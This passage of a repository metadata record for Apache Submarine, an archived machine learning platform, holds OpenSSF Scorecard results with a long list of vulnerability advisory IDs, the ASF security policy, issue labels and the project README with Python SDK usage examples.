                        "Info: apache contributor org/company found, tensorchord contributor org/company found, shangyuantech contributor org/company found, anyscale contributor org/company found, NetEase contributor org/company found, kubeflow contributor org/company found, flyteorg contributor org/company found, unionai contributor org/company found, apachecn contributor org/company found, dahua technology co. ltd contributor org/company found, netease contributor org/company found, ray-project contributor org/company found, apache @anyscale contributor org/company found, kapito.io contributor org/company found, linkedin contributor org/company found, fazz financial group contributor org/company found, tencent contributor org/company found, awesome-kyuubi contributor org/company found, national taiwan university contributor org/company found, waii.ai contributor org/company found, NTUEEInfoDep contributor org/company found, university of illinois urbana-champaign contributor org/company found, cloudera contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 23 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: :0"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": [
                        "Warn: Repository is archived."
                    ],
                    "score": 0,
                    "reason": "project is archived",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/deploy_docker_images.yml:24"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "internal error: internal error: invalid Dockerfile: Syntax error - can't find = in \"#\". Must be of the form: name=value",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 7 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/apache/.github/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/deploy_docker_images.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/deploy_website.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/jupyter_images.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/master.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/python.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-2qrg-x229-3v8q",
                        "Warn: Project is vulnerable to: GHSA-65fg-84f6-3jq3",
                        "Warn: Project is vulnerable to: GHSA-f7vh-qwp3-x37m",
                        "Warn: Project is vulnerable to: GHSA-fp5r-v3w9-4333",
                        "Warn: Project is vulnerable to: GHSA-w9p3-5cr8-m3jj",
                        "Warn: Project is vulnerable to: GHSA-jwcg-wv5x-vg3g",
                        "Warn: Project is vulnerable to: GHSA-mjmj-j48q-9wg2",
                        "Warn: Project is vulnerable to: GHSA-m697-4v8f-55qg / GO-2022-0923",
                        "Warn: Project is vulnerable to: GHSA-hrhx-6h34-j5hc / GO-2022-0325",
                        "Warn: Project is vulnerable to: GHSA-c6hx-pjc3-7fqr",
                        "Warn: Project is vulnerable to: GHSA-468w-8x39-gj5v / GO-2022-1152",
                        "Warn: Project is vulnerable to: GHSA-h2ph-vhm7-g4hp / GO-2022-1154",
                        "Warn: Project is vulnerable to: GHSA-7hj9-rv74-5g92",
                        "Warn: Project is vulnerable to: GHSA-6fwg-jrfw-ff7p / GO-2023-2377",
                        "Warn: Project is vulnerable to: GHSA-8g85-whqh-cr2f / GO-2023-2381",
                        "Warn: Project is vulnerable to: GHSA-fvhj-4qfh-q2hm / GO-2023-2376",
                        "Warn: Project is vulnerable to: GHSA-4vwx-54mw-vqfw / GO-2024-2722",
                        "Warn: Project is vulnerable to: GHSA-7f4j-64p6-5h5v / GO-2024-2726",
                        "Warn: Project is vulnerable to: GHSA-f7cq-5v43-8pwp / GO-2024-2880",
                        "Warn: Project is vulnerable to: GHSA-7jmw-8259-q9jx / GO-2024-2917",
                        "Warn: Project is vulnerable to: GHSA-rvj4-q8q5-8grf / GO-2024-2941",
                        "Warn: Project is vulnerable to: GHSA-gxrv-wf35-62w9 / GO-2024-2973",
                        "Warn: Project is vulnerable to: GHSA-62c8-mh53-4cqv / GO-2024-3135",
                        "Warn: Project is vulnerable to: GHSA-cg3q-j54f-5p7p / GO-2022-0322",
                        "Warn: Project is vulnerable to: GHSA-45x7-px36-x8w8 / GO-2023-2402",
                        "Warn: Project is vulnerable to: GHSA-fxg5-wq6x-vr4w / GO-2023-1495",
                        "Warn: Project is vulnerable to: GHSA-xrjj-mj9h-534m / GO-2022-1144",
                        "Warn: Project is vulnerable to: GHSA-vvpx-j8f3-3w6h / GO-2023-1571",
                        "Warn: Project is vulnerable to: GHSA-2wrh-6pvc-2jm9 / GO-2023-1988",
                        "Warn: Project is vulnerable to: GHSA-4374-p667-p6c8 / GO-2023-2102",
                        "Warn: Project is vulnerable to: GHSA-qppj-fm5r-hxr3",
                        "Warn: Project is vulnerable to: GHSA-4v7x-pqxf-cx7m / GO-2024-2687",
                        "Warn: Project is vulnerable to: GHSA-8r3f-844c-mc37 / GO-2024-2611",
                        "Warn: Project is vulnerable to: GHSA-hp87-p4gw-j4gq / GO-2022-0603",
                        "Warn: Project is vulnerable to: GHSA-67hx-6x53-jw92",
                        "Warn: Project is vulnerable to: GHSA-wf5p-g6vw-rhxx",
                        "Warn: Project is vulnerable to: GHSA-grv7-fg5c-xmjg",
                        "Warn: Project is vulnerable to: GHSA-jchw-25xp-jwwc",
                        "Warn: Project is vulnerable to: GHSA-cxjh-pqwp-8mfp",
                        "Warn: Project is vulnerable to: GHSA-4q6p-r6v2-jvc5",
                        "Warn: Project is vulnerable to: GHSA-9c47-m6qq-7p4h",
                        "Warn: Project is vulnerable to: GHSA-952p-6rrq-rcjv",
                        "Warn: Project is vulnerable to: GHSA-7fh5-64p2-3v2j",
                        "Warn: Project is vulnerable to: GHSA-gcx4-mw62-g8wm",
                        "Warn: Project is vulnerable to: GHSA-c2qf-rxjj-qqgw",
                        "Warn: Project is vulnerable to: GHSA-72xf-g2v4-qvf3",
                        "Warn: Project is vulnerable to: GHSA-mv48-hcvh-8jj8",
                        "Warn: Project is vulnerable to: GHSA-353f-5xf4-qw67",
                        "Warn: Project is vulnerable to: GHSA-c24v-8rfc-w8vw",
                        "Warn: Project is vulnerable to: GHSA-8jhw-289h-jh2g",
                        "Warn: Project is vulnerable to: GHSA-4vvj-4cpr-p986 / GHSA-64vr-g452-qvp3",
                        "Warn: Project is vulnerable to: GHSA-9cwx-2883-4wfx",
                        "Warn: Project is vulnerable to: GHSA-j8xg-fqg3-53r7",
                        "Warn: Project is vulnerable to: GHSA-3h5v-q93c-6h6q",
                        "Warn: Project is vulnerable to: GHSA-3832-9276-x7gf",
                        "Warn: Project is vulnerable to: GHSA-78wr-2p64-hpwj",
                        "Warn: Project is vulnerable to: GHSA-gwrp-pvrq-jmwv",
                        "Warn: Project is vulnerable to: GHSA-2fqw-684c-pvp7",
                        "Warn: Project is vulnerable to: GHSA-4jhc-wjr3-pwh2",
                        "Warn: Project is vulnerable to: GHSA-6vvh-5794-vpmj",
                        "Warn: Project is vulnerable to: GHSA-7fr2-94h7-ccg2",
                        "Warn: Project is vulnerable to: GHSA-g7p8-r2ch-4rmf",
                        "Warn: Project is vulnerable to: GHSA-m4h3-7mc2-v295",
                        "Warn: Project is vulnerable to: GHSA-mf27-wg66-m8f5",
                        "Warn: Project is vulnerable to: GHSA-9vjp-v76f-g363",
                        "Warn: Project is vulnerable to: GHSA-grg4-wf29-r9vv",
                        "Warn: Project is vulnerable to: GHSA-6mjq-h674-j845",
                        "Warn: Project is vulnerable to: GHSA-mm9x-g8pc-w292",
                        "Warn: Project is vulnerable to: GHSA-p2v9-g2qv-p635",
                        "Warn: Project is vulnerable to: GHSA-g2fg-mr77-6vrm",
                        "Warn: Project is vulnerable to: GHSA-86jx-wr74-xr74",
                        "Warn: Project is vulnerable to: GHSA-rrvf-5w4r-3x7v",
                        "Warn: Project is vulnerable to: GHSA-6xx3-rg99-gc3p",
                        "Warn: Project is vulnerable to: GHSA-72m5-fvvv-55m6",
                        "Warn: Project is vulnerable to: GHSA-8xfc-gm6g-vgpv",
                        "Warn: Project is vulnerable to: GHSA-hr8g-6v94-x4m9",
                        "Warn: Project is vulnerable to: GHSA-m44j-cfrm-g8qc",
                        "Warn: Project is vulnerable to: GHSA-v435-xc8x-wvr9",
                        "Warn: Project is vulnerable to: GHSA-wjxj-5m7g-mg7q",
                        "Warn: Project is vulnerable to: GHSA-8vhq-qq4p-grq3",
                        "Warn: Project is vulnerable to: GHSA-g6ph-x5wf-g337",
                        "Warn: Project is vulnerable to: GHSA-jcwr-x25h-x5fh",
                        "Warn: Project is vulnerable to: GHSA-48rh-qgjr-xfj6",
                        "Warn: Project is vulnerable to: GHSA-gp7f-rwcx-9369",
                        "Warn: Project is vulnerable to: GHSA-m72m-mhq2-9p6c",
                        "Warn: Project is vulnerable to: GHSA-5mg8-w23w-74h3",
                        "Warn: Project is vulnerable to: GHSA-7g45-4rm6-3mm3",
                        "Warn: Project is vulnerable to: GHSA-mvr2-9pj6-7w5j",
                        "Warn: Project is vulnerable to: GHSA-v2xm-76pq-phcf",
                        "Warn: Project is vulnerable to: GHSA-7r82-7xv7-xcpj",
                        "Warn: Project is vulnerable to: GHSA-288c-cq4h-88gq",
                        "Warn: Project is vulnerable to: GHSA-4gq5-ch57-c2mg",
                        "Warn: Project is vulnerable to: GHSA-4w82-r329-3q67",
                        "Warn: Project is vulnerable to: GHSA-57j2-w4cx-62h2",
                        "Warn: Project is vulnerable to: GHSA-5949-rw7g-wx7w",
                        "Warn: Project is vulnerable to: GHSA-5r5r-6hpj-8gg9",
                        "Warn: Project is vulnerable to: GHSA-5ww9-j83m-q7qx",
                        "Warn: Project is vulnerable to: GHSA-645p-88qh-w398",
                        "Warn: Project is vulnerable to: GHSA-6fpp-rgj9-8rwc",
                        "Warn: Project is vulnerable to: GHSA-85cw-hj65-qqv9",
                        "Warn: Project is vulnerable to: GHSA-89qr-369f-5m5x",
                        "Warn: Project is vulnerable to: GHSA-8c4j-34r4-xr8g",
                        "Warn: Project is vulnerable to: GHSA-8w26-6f25-cm9x",
                        "Warn: Project is vulnerable to: GHSA-9gph-22xh-8x98",
                        "Warn: Project is vulnerable to: GHSA-9m6f-7xcq-8vf8",
                        "Warn: Project is vulnerable to: GHSA-c8hm-7hpq-7jhg",
                        "Warn: Project is vulnerable to: GHSA-cf6r-3wgc-h863",
                        "Warn: Project is vulnerable to: GHSA-cggj-fvv3-cqwv",
                        "Warn: Project is vulnerable to: GHSA-cjjf-94ff-43w7",
                        "Warn: Project is vulnerable to: GHSA-cmfg-87vq-g5g4",
                        "Warn: Project is vulnerable to: GHSA-cvm9-fjm9-3572",
                        "Warn: Project is vulnerable to: GHSA-f3j5-rmmp-3fc5",
                        "Warn: Project is vulnerable to: GHSA-f9xh-2qgp-cq57",
                        "Warn: Project is vulnerable to: GHSA-fmmc-742q-jg75",
                        "Warn: Project is vulnerable to: GHSA-fqwf-pjwf-7vqv",
                        "Warn: Project is vulnerable to: GHSA-gjmw-vf9h-g25v",
                        "Warn: Project is vulnerable to: GHSA-gwp4-hfv6-p7hw",
                        "Warn: Project is vulnerable to: GHSA-gww7-p5w4-wrfv",
                        "Warn: Project is vulnerable to: GHSA-h3cw-g4mq-c5x2",
                        "Warn: Project is vulnerable to: GHSA-h592-38cm-4ggp",
                        "Warn: Project is vulnerable to: GHSA-h822-r4r5-v8jg",
                        "Warn: Project is vulnerable to: GHSA-jjjh-jjxp-wpff",
                        "Warn: Project is vulnerable to: GHSA-m6x4-97wx-4q27",
                        "Warn: Project is vulnerable to: GHSA-mph4-vhrx-mv67",
                        "Warn: Project is vulnerable to: GHSA-mx7p-6679-8g3q",
                        "Warn: Project is vulnerable to: GHSA-p43x-xfjf-5jhr",
                        "Warn: Project is vulnerable to: GHSA-q93h-jc49-78gg",
                        "Warn: Project is vulnerable to: GHSA-qjw2-hr98-qgfh",
                        "Warn: Project is vulnerable to: GHSA-qr7j-h6gg-jmgc",
                        "Warn: Project is vulnerable to: GHSA-r3gr-cxrf-hg25",
                        "Warn: Project is vulnerable to: GHSA-r695-7vr9-jgc2",
                        "Warn: Project is vulnerable to: GHSA-rfx6-vp9g-rh7v",
                        "Warn: Project is vulnerable to: GHSA-rgv9-q543-rqg4",
                        "Warn: Project is vulnerable to: GHSA-rpr3-cw39-3pxh",
                        "Warn: Project is vulnerable to: GHSA-v585-23hc-c647",
                        "Warn: Project is vulnerable to: GHSA-vfqx-33qm-g869",
                        "Warn: Project is vulnerable to: GHSA-w3f4-3q6j-rh82",
                        "Warn: Project is vulnerable to: GHSA-wh8g-3j2c-rqj5",
                        "Warn: Project is vulnerable to: GHSA-4gg5-vx3j-xwc7",
                        "Warn: Project is vulnerable to: GHSA-735f-pc8j-v9w8",
                        "Warn: Project is vulnerable to: GHSA-77rm-9x9h-xj3g",
                        "Warn: Project is vulnerable to: GHSA-g5ww-5jh7-63cx",
                        "Warn: Project is vulnerable to: GHSA-h4h5-3hr4-j3g2",
                        "Warn: Project is vulnerable to: GHSA-wrvw-hg22-4m67",
                        "Warn: Project is vulnerable to: GHSA-cgp8-4m63-fhh5",
                        "Warn: Project is vulnerable to: GHSA-973x-65j7-xcf4",
                        "Warn: Project is vulnerable to: GHSA-6628-q6j9-w8vg",
                        "Warn: Project is vulnerable to: GHSA-9hxf-ppjv-w6rq",
                        "Warn: Project is vulnerable to: GHSA-cfgp-2977-2fmm",
                        "Warn: Project is vulnerable to: GHSA-269q-hmxg-m83q / GHSA-5mcr-gq6c-3hq2",
                        "Warn: Project is vulnerable to: GHSA-cqqj-4p63-rrmm",
                        "Warn: Project is vulnerable to: GHSA-f256-j965-7f32 / GHSA-wm47-8v5p-wjpj",
                        "Warn: Project is vulnerable to: GHSA-wx5j-54mm-rqqq",
                        "Warn: Project is vulnerable to: GHSA-p979-4mfw-53vg",
                        "Warn: Project is vulnerable to: GHSA-5jpm-x58v-624v",
                        "Warn: Project is vulnerable to: GHSA-xpw8-rcwv-8f8p",
                        "Warn: Project is vulnerable to: GHSA-r7pg-v2c8-mfg3",
                        "Warn: Project is vulnerable to: GHSA-rhrv-645h-fjfh",
                        "Warn: Project is vulnerable to: GHSA-fj2m-w3wv-x9pr",
                        "Warn: Project is vulnerable to: GHSA-hxp5-8pgq-mgv9",
                        "Warn: Project is vulnerable to: GHSA-4g9r-vxhx-9pgx",
                        "Warn: Project is vulnerable to: GHSA-7hfm-57qf-j43q",
                        "Warn: Project is vulnerable to: GHSA-crv7-7245-f45f",
                        "Warn: Project is vulnerable to: GHSA-hrmr-f5m6-m9pq",
                        "Warn: Project is vulnerable to: GHSA-mc84-pj99-q6hh",
                        "Warn: Project is vulnerable to: GHSA-xqfj-vm6h-2x34",
                        "Warn: Project is vulnerable to: GHSA-42xw-p62x-hwcf",
                        "Warn: Project is vulnerable to: GHSA-rcjc-c4pj-xxrp",
                        "Warn: Project is vulnerable to: GHSA-8wm5-8h9c-47pc",
                        "Warn: Project is vulnerable to: GHSA-f5fw-25gw-5m92",
                        "Warn: Project is vulnerable to: GHSA-f8vc-wfc8-hxqh",
                        "Warn: Project is vulnerable to: GHSA-gx2c-fvhc-ph4j",
                        "Warn: Project is vulnerable to: GHSA-h24p-qwf4-84q8",
                        "Warn: Project is vulnerable to: GHSA-mf7c-35mq-75pj",
                        "Warn: Project is vulnerable to: GHSA-rmpj-7c96-mrg8",
                        "Warn: Project is vulnerable to: GHSA-58jx-f5rf-qgqf",
                        "Warn: Project is vulnerable to: GHSA-2jc4-r94c-rp7h",
                        "Warn: Project is vulnerable to: GHSA-94rr-4jr5-9h2p",
                        "Warn: Project is vulnerable to: GHSA-wv7w-rj2x-556x",
                        "Warn: Project is vulnerable to: GHSA-phg2-9c5g-m4q7",
                        "Warn: Project is vulnerable to: GHSA-2hw2-62cp-p9p7",
                        "Warn: Project is vulnerable to: GHSA-7286-pgfv-vxvh",
                        "Warn: Project is vulnerable to: GHSA-7cwj-j333-x7f7",
                        "Warn: Project is vulnerable to: GHSA-ccqf-c5hq-77mp",
                        "Warn: Project is vulnerable to: GHSA-c27h-mcmw-48hv",
                        "Warn: Project is vulnerable to: GHSA-r6j9-8759-g62w",
                        "Warn: Project is vulnerable to: GHSA-8wh2-6qhj-h7j9",
                        "Warn: Project is vulnerable to: GHSA-2qp4-g3q3-f92w",
                        "Warn: Project is vulnerable to: GHSA-cqj8-47ch-rvvq",
                        "Warn: Project is vulnerable to: GHSA-55g7-9cwv-5qfv",
                        "Warn: Project is vulnerable to: GHSA-fjpj-2g6w-x25r",
                        "Warn: Project is vulnerable to: GHSA-pqr6-cmr2-h8hf",
                        "Warn: Project is vulnerable to: GHSA-qcwq-55hx-v3vh",
                        "Warn: Project is vulnerable to: GHSA-334p-wv2m-w3vp",
                        "Warn: Project is vulnerable to: GHSA-7j4h-8wpf-rqfh",
                        "Warn: Project is vulnerable to: GHSA-h65f-jvqw-m9fj",
                        "Warn: Project is vulnerable to: GHSA-vmqm-g3vh-847m",
                        "Warn: Project is vulnerable to: GHSA-w4jq-qh47-hvjq",
                        "Warn: Project is vulnerable to: GHSA-93q8-gq69-wqmw",
                        "Warn: Project is vulnerable to: GHSA-qwcr-r2fm-qrc7",
                        "Warn: Project is vulnerable to: GHSA-pxg6-pf52-xh8x",
                        "Warn: Project is vulnerable to: GHSA-7gc6-qh9x-w6h8",
                        "Warn: Project is vulnerable to: GHSA-mf6x-hrgr-658f",
                        "Warn: Project is vulnerable to: GHSA-xrh7-m5pp-39r6",
                        "Warn: Project is vulnerable to: GHSA-rv95-896h-c2vc",
                        "Warn: Project is vulnerable to: GHSA-qw6h-vgh9-j6wx",
                        "Warn: Project is vulnerable to: GHSA-pfrx-2q88-qq97",
                        "Warn: Project is vulnerable to: GHSA-rc47-6667-2j5j",
                        "Warn: Project is vulnerable to: GHSA-c7qv-q95q-8v27",
                        "Warn: Project is vulnerable to: GHSA-78xj-cgh5-2h22",
                        "Warn: Project is vulnerable to: GHSA-2p57-rm9w-gvfp",
                        "Warn: Project is vulnerable to: GHSA-76p3-8jx3-jpfq",
                        "Warn: Project is vulnerable to: GHSA-3rfm-jhwj-7488",
                        "Warn: Project is vulnerable to: GHSA-hhq3-ff78-jv3g",
                        "Warn: Project is vulnerable to: GHSA-p6mc-m468-83gw",
                        "Warn: Project is vulnerable to: GHSA-f8q6-p94x-37v3",
                        "Warn: Project is vulnerable to: GHSA-r683-j2x4-v87g",
                        "Warn: Project is vulnerable to: GHSA-rp65-9cf3-cjxr",
                        "Warn: Project is vulnerable to: GHSA-9wv6-86v2-598j",
                        "Warn: Project is vulnerable to: GHSA-m6fv-jmcg-4jfg",
                        "Warn: Project is vulnerable to: GHSA-cm22-4g7w-348p",
                        "Warn: Project is vulnerable to: GHSA-w5p7-h5w8-2hfq",
                        "Warn: Project is vulnerable to: GHSA-fhg7-m89q-25r3",
                        "Warn: Project is vulnerable to: GHSA-wr3j-pwj9-hqq6"
                    ],
                    "score": 0,
                    "reason": "224 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/apache/.github/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nThis is a project of the [Apache Software Foundation](https://apache.org) and follows the ASF [vulnerability handling process](https://apache.org/security/#vulnerability-handling).\n\n## Reporting a Vulnerability\n\nTo report a new vulnerability you have discovered please follow the [ASF vulnerability reporting process](https://apache.org/security/#reporting-a-vulnerability).\n",
        "project_all_labels": [
            "bug",
            "dependencies",
            "documentation",
            "duplicate",
            "enhancement",
            "go",
            "good first issue",
            "help wanted",
            "invalid",
            "java",
            "javascript",
            "python",
            "question",
            "wontfix"
        ],
        "README_content": "<!---\n  Licensed under the Apache License, Version 2.0 (the \"License\");\n  you may not use this file except in compliance with the License.\n  You may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n  See the License for the specific language governing permissions and\n  limitations under the License. See accompanying LICENSE file.\n-->\n\n<div align=\"center\">\n\n![Colored_logo_with_text](website/static/img/icons/color_logo_with_text.png)\n\n![Submarine workflow](https://github.com/apache/submarine/actions/workflows/master.yml/badge.svg?branch=master) ![python-sdk workflow](https://github.com/apache/submarine/actions/workflows/python.yml/badge.svg?branch=master) [![License](https://img.shields.io/badge/license-Apache%202-4EB1BA.svg)](https://www.apache.org/licenses/LICENSE-2.0.html) [![PyPI version](https://badge.fury.io/py/apache-submarine.svg)](https://badge.fury.io/py/apache-submarine)\n\n</div>\n\n# What is Apache Submarine?\n\n**Apache Submarine** (Submarine for short) is an **End-to-End Machine Learning Platform** to allow data scientists to create end-to-end machine learning workflows. On **Submarine**, data scientists can finish each stage in the ML model lifecycle, including data exploration, data pipeline creation, model training, serving, and monitoring.\n\n## Why Submarine?\n\nSome open-source and commercial projects are trying to build an end-to-end ML platform. What's the vision of Submarine?\n\n### Problems\n\n1. Many platforms lack easy-to-use user interfaces (API, SDK, and IDE, etc.)\n2. In the same company, data scientists in different teams usually spend much time on developments of existing feature sets and models.\n3. Data scientists put emphasis on domain-specific tasks (e.g. Click-Through-Rate), but they need to implement their models from scratch with SDKs provided by existing platforms.\n4. Many platforms lack a unified workbench to manage each component in the ML lifecycle.\n\n_Theodore Levitt_ once said:\n\n```\n“People don’t want to buy a quarter-inch drill. They want a quarter-inch hole.”\n```\n\n### Goals of Submarine\n\n#### Model Training (Experiment)\n\n- Run/Track distributed training `experiment` on prem or cloud via easy-to-use UI/API/SDK.\n- Easy for data scientists to manage versions of `experiment` and dependencies of `environment`.\n- Support popular machine learning frameworks, including **TensorFlow**, **PyTorch**, **Horovod**, and **MXNet**\n- Provide pre-defined **template** for data scientists to implement domain-specific tasks easily (e.g. using DeepFM template to build a CTR prediction model)\n- Support many compute resources (e.g. CPU and GPU, etc.)\n- Support **Kubernetes** and **YARN**\n- Pipeline is also on the backlog, we will look into pipeline for training in the future.\n\n#### Notebook Service\n\n- Submarine aims to provide a notebook service (e.g. Jupyter notebook) which allows users to manage notebook instances running on the cluster.\n\n#### Model Management (Serving/versioning/monitoring, etc.)\n\n- Model management for model-serving/versioning/monitoring is on the roadmap.\n\n## Easy-to-use User Interface\n\nAs mentioned above, Submarine attempts to provide **Data-Scientist-friendly** UI to make data scientists have a good user experience. Here're some examples.\n\n### Example: Submit a distributed Tensorflow experiment via Submarine Python SDK\n\n#### Run a Tensorflow Mnist experiment\n\n```python\n\n# New a submarine client of the submarine server\nsubmarine_client = submarine.ExperimentClient(host='http://localhost:8080')\n\n# The experiment's environment, could be Docker image or Conda environment based\nenvironment = EnvironmentSpec(image='apache/submarine:tf-dist-mnist-test-1.0')\n\n# Specify the experiment's name, framework it's using, namespace it will run in,\n# the entry point. It can also accept environment variables. etc.\n# For PyTorch job, the framework should be 'Pytorch'.\nexperiment_meta = ExperimentMeta(name='mnist-dist',\n                                 namespace='default',\n                                 framework='Tensorflow',\n                                 cmd='python /var/tf_dist_mnist/dist_mnist.py --train_steps=100')\n# 1 PS task of 2 cpu, 1GB\nps_spec = ExperimentTaskSpec(resources='cpu=2,memory=1024M',\n                             replicas=1)\n# 1 Worker task\nworker_spec = ExperimentTaskSpec(resources='cpu=2,memory=1024M',\n                                 replicas=1)\n\n# Wrap up the meta, environment and task specs into an experiment.\n# For PyTorch job, the specs would be \"Master\" and \"Worker\".\nexperiment_spec = ExperimentSpec(meta=experiment_meta,\n                                 environment=environment,\n                                 spec={'Ps':ps_spec, 'Worker': worker_spec})\n\n# Submit the experiment to submarine server\nexperiment = submarine_client.create_experiment(experiment_spec=experiment_spec)\n\n# Get the experiment ID\nid = experiment['experimentId']\n\n```\n\n#### Query a specific experiment\n\n```python\nsubmarine_client.get_experiment(id)\n```\n\n#### Wait for finish\n\n```python\nsubmarine_client.wait_for_finish(id)\n```\n\n#### Get the experiment's log\n\n```python\nsubmarine_client.get_log(id)\n```\n\n#### Get all running experiment\n\n```python\nsubmarine_client.list_experiments(status='running')\n```\n\nFor a quick-start, see [Submarine On K8s](https://submarine.apache.org/docs/gettingStarted/quickstart)\n\n### Example: Submit a pre-defined experiment template job\n\n### Example: Submit an experiment via Submarine UI\n\n(Available on 0.5.0, see Roadmap)\n\n## Architecture, Design and requirements\n\nIf you want to know more about Submarine's architecture, components, requirements and design doc, they can be found on [Architecture-and-requirement](https://submarine.apache.org/docs/designDocs/architecture-and-requirements)\n\nDetailed design documentation, implementation notes can be found at: [Implementation notes](https://submarine.apache.org/docs/designDocs/implementation-notes)\n\n## Apache Submarine Community\n\nRead the [Apache Submarine Community Guide](https://submarine.apache.org/docs/community/README)\n\nHow to contribute [Contributing Guide](https://submarine.apache.org/docs/community/contributing)\n\nLogin Submarine slack channel: [https://join.slack.com/t/asf-submarine/shared_invite](https://join.slack.com/t/asf-submarine/shared_invite/zt-18614cyqs-UhspdUOneiyg~ZPiVomDqw)\n\nIssue Tracking: https://issues.apache.org/jira/projects/SUBMARINE\n\n## User Document\n\nSee [User Guide Home Page](https://submarine.apache.org/docs/)\n\n## Developer Document\n\nSee [Developer Guide Home Page](https://submarine.apache.org/docs/devDocs/Development/)\n\n## Roadmap\n\nWhat to know more about what's coming for Submarine? Please check the roadmap out: https://cwiki.apache.org/confluence/display/SUBMARINE/Roadmap\n\n## Changelog\n\nFrom [here](https://submarine.apache.org/versions/), you can know the changelog and the issue tracker of different version of Apache Submarine.\n\n## Resources\n\n[Apache submarine: a unified machine learning platform made simple](https://dl.acm.org/doi/abs/10.1145/3517207.3526984) at EuroMLSys '22\n\n## License\n\nThe Apache Submarine project is licensed under the Apache 2.0 License. See the [LICENSE](./LICENSE) file for details.\n",
        "num_commits": 1051,
